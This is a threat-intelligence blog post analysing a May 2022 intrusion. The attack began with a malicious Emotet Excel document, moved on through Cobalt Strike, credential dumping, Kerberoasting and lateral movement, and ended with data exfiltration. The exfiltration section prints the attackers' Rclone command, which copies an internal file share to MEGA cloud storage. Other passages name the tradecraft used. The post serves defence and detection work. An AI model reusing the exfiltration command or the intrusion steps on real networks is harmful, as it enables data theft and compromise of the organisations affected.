			<h1 class="entry-title">Dead or Alive? An Emotet Story</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/" rel="bookmark"><time class="entry-date published" datetime="2022-09-12T00:32:41+00:00">September 12, 2022</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<p>In this intrusion from May 2022, we observed a domain-wide compromise that started from a malware ridden Excel document containing the never-dying malware, Emotet.</p>



<p>The post-exploitation started very soon after the initial compromise. The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host. After three days of discovery and lateral movement, the threat actors exfiltrated sensitive data using Rclone before leaving the network.</p>



<p>After a successful takedown thanks to Interpol and Eurojust efforts, Emotet was resurrected in November 2021 with the help of <a href="https://www.malwarebytes.com/blog/news/2021/11/trickbot-helps-emotet-come-back-from-the-dead" target="_blank" rel="noreferrer noopener">Trickbot</a> malware. Since then, Emotet has been <a href="https://www.proofpoint.com/us/blog/threat-insight/emotet-tests-new-delivery-techniques" target="_blank" rel="noreferrer noopener">testing different initial access</a> payloads while its developers were busy improving the core functionality of the actual malware. Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions.</p>
<p>In a few weeks, we&#8217;ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware.</p>



<h2 class="wp-block-heading">Case Summary</h2>



<p>Back in May, we witnessed an intrusion that started from a phishing email which included Emotet. The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.</p>



<p>The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months. After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.</p>



<p>Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign. This entailed connecting to various email servers and sending new emails with attached xls and zip files. This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.</p>



<p>Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host. Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder. Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS. Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.</p>



<p>At 29 hours from initial access, the threat actors began their first lateral movement. This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation. From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat. Pass-the-Hash behavior was observed targeting several accounts on the lateral host. Use of Cobalt Strike&#8217;s Get-System module was also apparent via the logs.</p>



<p>The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network. More account discovery was then observed, with queries for Domain Administrators and a backup account.</p>



<p>At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL. Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS. After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera&#8211;for an additional means of persistence and command and control. During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.</p>



<p>They returned the next day, at the same time as the previous day, and picked up where they left off. They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer. Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers. Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA. Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter <em>&#8211;ignore-existing</em> from two different hosts on the network. Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.</p>





<p>On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server. This was the last activity we observed from this group. These cases commonly end up with ransomware in addition to data exfiltration. This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.</p>

<h2 class="wp-block-heading">Execution</h2>



<h3 class="wp-block-heading">Emotet Execution</h3>



<p>The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll . Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.</p>



<p>A new file is then created in C:\%USERPROFILE%\AppData\Local\ with a folder that also consists of random characters.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/09/14335-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-9616" src="https://thedfirreport.com/wp-content/uploads/2022/09/14335-004.png" alt="" width="1746" height="438" srcset="https://thedfirreport.com/wp-content/uploads/2022/09/14335-004.png 1746w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-004-300x75.png 300w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-004-1024x257.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-004-768x193.png 768w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-004-1536x385.png 1536w" sizes="auto, (max-width: 1746px) 100vw, 1746px" /></a></p>

<h2 class="wp-block-heading">Credential Access</h2>

Data observed using sysmon event id 10 shows the use of the <span style="color: #000000;">SearchIndexer process, similar to behavior <a href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" target="_blank" rel="noopener">observed in a prior case</a>, followed by known Cobalt Strike <a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles/search?q=SearchTextHarvester" target="_blank" rel="noopener">malleable profile</a> named pipes.</span></p>

<h3 class="wp-block-heading">Atera and Splashtop</h3>



<p>Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion. Atera granted the threat actors with interactive access. We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.</p>



<h2 class="wp-block-heading">Exfiltration</h2>



<p>The threat actors used Rclone to exfiltrate sensitive data to <a href="https://MEGA.io" target="_blank" rel="noreferrer noopener">MEGA.io</a> cloud storage. Command line logging revealed the destination to be the Mega service and the network shares targeted.</p>



<p><a href="https://thedfirreport.com/wp-content/uploads/2022/09/14335-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-9638" src="https://thedfirreport.com/wp-content/uploads/2022/09/14335-023.png" alt="" width="1972" height="155" srcset="https://thedfirreport.com/wp-content/uploads/2022/09/14335-023.png 1972w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-023-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-023-1024x80.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-023-768x60.png 768w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-023-1536x121.png 1536w" sizes="auto, (max-width: 1972px) 100vw, 1972px" /></a></p>
<pre>rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4</pre>
<p>This activity was also visible on the network via Zeek logs showing the SMB share connection activity.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/09/14335-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-9639" src="https://thedfirreport.com/wp-content/uploads/2022/09/14335-024.png" alt="" width="1716" height="955" srcset="https://thedfirreport.com/wp-content/uploads/2022/09/14335-024.png 1716w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-024-300x167.png 300w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-024-1024x570.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-024-768x427.png 768w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-024-1536x855.png 1536w" sizes="auto, (max-width: 1716px) 100vw, 1716px" /></a></figure>



<h2 class="wp-block-heading">Actions on Objectives</h2>



<p>Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns. In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.</p>



<p>The Emotet mailer started roughly once each day during the intrusion. Marked by bursts of connection to various email servers.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/09/14335-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-9640" src="https://thedfirreport.com/wp-content/uploads/2022/09/14335-025.png" alt="" width="1789" height="846" srcset="https://thedfirreport.com/wp-content/uploads/2022/09/14335-025.png 1789w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-025-300x142.png 300w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-025-1024x484.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-025-768x363.png 768w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-025-1536x726.png 1536w" sizes="auto, (max-width: 1789px) 100vw, 1789px" /></a></figure>



<p>The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/09/14335-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-9641" src="https://thedfirreport.com/wp-content/uploads/2022/09/14335-026.png" alt="" width="744" height="1239" srcset="https://thedfirreport.com/wp-content/uploads/2022/09/14335-026.png 744w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-026-180x300.png 180w, https://thedfirreport.com/wp-content/uploads/2022/09/14335-026-615x1024.png 615w" sizes="auto, (max-width: 744px) 100vw, 744px" /></a></figure>



<p>&nbsp;</p>
<p>We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware. We have a case coming up in a few weeks where it does exactly that.</p>
